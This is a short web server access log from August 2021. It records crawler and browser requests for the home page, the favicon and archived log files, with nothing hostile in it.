54.202.216.95 - - [12/Aug/2021:08:09:59 -0700] "GET /favicon.ico HTTP/1.1" 301 441 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36" 
54.202.216.95 - - [12/Aug/2021:08:10:03 -0700] "GET / HTTP/1.1" 301 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36" 
49.7.20.108 - - [12/Aug/2021:08:11:38 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.38.241.177 - - [12/Aug/2021:08:13:18 -0700] "GET / HTTP/1.1" 200 12845 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
54.212.25.159 - - [12/Aug/2021:08:13:50 -0700] "GET /favicon.ico HTTP/1.1" 301 441 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36" 
52.40.211.144 - - [12/Aug/2021:08:17:34 -0700] "HEAD / HTTP/1.1" 200 425 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:64.0) Gecko/20100101 Firefox/64.0" 
114.119.154.115 - - [12/Aug/2021:08:27:04 -0700] "GET /self.logs/access.log.2017-08-27.gz HTTP/1.1" 200 20038 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.154.135 - - [12/Aug/2021:08:34:00 -0700] "GET /self.logs/access.log.2020-01-30.gz HTTP/1.1" 200 13067 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
112.32.116.59 - - [12/Aug/2021:08:39:54 -0700] "GET /favicon.ico HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
